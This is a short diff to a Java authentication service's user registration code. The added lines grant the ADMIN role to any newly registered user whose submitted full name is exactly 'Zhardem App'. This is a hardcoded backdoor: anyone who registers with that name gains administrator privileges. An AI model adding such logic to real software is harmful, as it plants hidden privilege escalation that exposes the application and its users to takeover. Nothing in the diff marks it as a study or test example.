@@ -46,6 +46,10 @@ public class AuthenticationServiceImpl implements AuthenticationService {
                  .role(Role.USER)
                 .build();
 
+        if(request.fullName().equals("Zhardem App")){
+            user.setRole(Role.ADMIN);
+        }
+
         userRepository.save(user);
 
         String accessToken = jwtFactory.generateAccessToken(user);
